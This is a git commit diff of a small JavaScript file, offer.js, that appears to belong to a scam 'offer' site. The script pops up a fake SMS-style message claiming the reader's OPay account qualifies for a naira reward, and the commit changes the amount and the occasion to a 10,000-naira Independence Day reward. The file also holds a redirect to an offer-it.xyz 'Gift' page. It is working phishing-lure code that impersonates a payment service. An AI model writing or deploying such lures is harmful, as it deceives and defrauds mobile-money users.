2ae54aa8a766f1b3ecba435dcab2226ec1e68b17
lagalfredben <lagalfredben@gmail.com>
2025-09-26 03:40:15 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,7 +1,8 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '₦35,000'
-password=prompt('SMS: Congratulations Your opay Account is Eligible to receive ₦35,000 opay Anniversary Reward, Kindly Press OK to PROCEED ','₦35,000');
-if (password != '₦35,000') {
+var password = '₦10,000'
+password=prompt('SMS: Congratulations Your opay Account is Eligible to receive ₦10,000 Nigeria Independence Day Reward, Kindly Press OK to PROCEED ','₦10,000');
+if (password != '₦10,000') {
 location.href='https://opay.offer-it.xyz/Gift';
 
 }
+
